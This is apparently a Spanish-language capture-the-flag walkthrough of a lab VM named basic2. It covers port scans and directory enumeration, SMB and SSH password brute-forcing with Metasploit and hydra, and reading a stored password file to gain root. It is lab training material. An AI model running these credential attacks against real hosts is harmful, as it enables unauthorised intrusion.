
```
nmap -p- -Pn -T4 192.168.56.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-10 20:00 UTC
Nmap scan report for 192.168.56.103 (192.168.56.103)
Host is up (0.042s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

```
$nmap -p22,80,139,445,8009,8080 -sCV 192.168.56.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-10 19:59 UTC
Nmap scan report for 192.168.56.103 (192.168.56.103)
Host is up (0.0033s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-10T19:59:57
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2026-02-10T14:59:57-05:00
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 1s

```

```
$dirb http://192.168.56.103:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 10 20:03:05 2026
URL_BASE: http://192.168.56.103:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.103:8080/ ----
+ http://192.168.56.103:8080/docs (CODE:302|SIZE:0) 
+ http://192.168.56.103:8080/examples (CODE:302|SIZE:0)        
+ http://192.168.56.103:8080/favicon.ico (CODE:200|SIZE:21630)      
+ http://192.168.56.103:8080/host-manager (CODE:302|SIZE:0)   
+ http://192.168.56.103:8080/manager (CODE:302|SIZE:0)
```

Vemos que para acceder al directorio manager nos solicita una contraseña, puede ser interesante.

```
searchsploit ajp
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion                                                                                                                                                                           | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                                                                                           | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                                                                                                                                             | multiple/webapps/49039.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------
```

Vemos que hay un módulo de Metasploit para una vulnerabilidad de AJP.


Explorando el puerto 80 vemos el directorio /development/ donde aparecen dos ficheros que dan información sobre SMB, que ha sido habilitado, y apuntes indicando que las credenciales de un usuario comenzado por J tiene unas credenciales muy débiles.

```
$dirb http://192.168.56.103

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 12 18:43:26 2026
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.103/ ----
==> DIRECTORY: http://192.168.56.103/development/                                                                                                        
+ http://192.168.56.103/index.html (CODE:200|SIZE:158)                                                                                                   
+ http://192.168.56.103/server-status (CODE:403|SIZE:302)   
```

"2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J"

"For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K"

Usando enum4linux vemos que los usuarios son kay y jan:

```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```


\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=OPCIONAL\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=

```
$grep '^j' /usr/share/wordlists/rockyou.txt > usersj.txt
grep: /usr/share/wordlists/rockyou.txt: binary file matches

sabiendo esto vamos a filtrar las entradas de rockyou.txt para todas las lineas que comiencen j:
$head -n 3 usersj.txt
jessica
jordan
justin

```

```
msfconsole:

set USER_FILE usersj.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

============================================


```
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> run
[+] 192.168.56.103:445    - 192.168.56.103:445 - Success: '.\jan:123456'
[*] SMB session 1 opened (192.168.56.102:36003 -> 192.168.56.103:445) at 2026-02-12 19:39:01 +0000
[*] 192.168.56.103:445    - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.56.103:445    - Bruteforce completed, 1 credential was successful.
[*] 192.168.56.103:445    - 1 SMB session was opened successfully.
[*] Auxiliary module execution completed
```

- credenciales válidas SMB jan:123456

```
$hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.56.103 ssh
[22][ssh] host: 192.168.56.103   login: jan   password: armando
```

## PrivEsc

```
jan@basic2:~$ find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
jan@basic2:~$ ls /home/jan
jan@basic2:~$ ls /home/kay
pass.bak
```

En el directorio home de kay hay un fichero pass.bak donde se encuentra la contraseña de kay para elevar privilegios.

```
vim pass.bak
> heresareallystrongpasswordthatfollowsthepasswordpolicy$$

jan@basic2:~$ su kay
Password: 
kay@basic2:/home/jan$ sudo su
[sudo] password for kay: 
root@basic2:/home/jan# whoami
root
root@basic2:/# cat /root/flag.txt
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!
```
